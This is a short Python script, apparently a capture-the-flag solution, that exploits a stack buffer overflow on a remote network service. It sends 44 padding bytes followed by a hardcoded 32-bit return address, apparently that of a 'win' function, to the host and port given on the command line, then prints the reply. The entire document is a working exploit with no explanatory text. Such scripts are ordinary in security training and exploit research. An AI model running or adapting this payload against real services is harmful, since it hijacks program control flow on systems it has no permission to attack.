import socket
import argparse
import struct

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

offset = 44
win = struct.pack("<I", 0x080491F6)

payload = b"A" * offset + win + b"\n"

with socket.socket() as s:
    s.settimeout(2)
    s.connect((args.host, args.port))

    try:
        print(s.recv(4096).decode(), end="")
    except:
        pass

    s.sendall(payload)

    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            print(data.decode(errors="ignore"), end="")
    except:
        pass
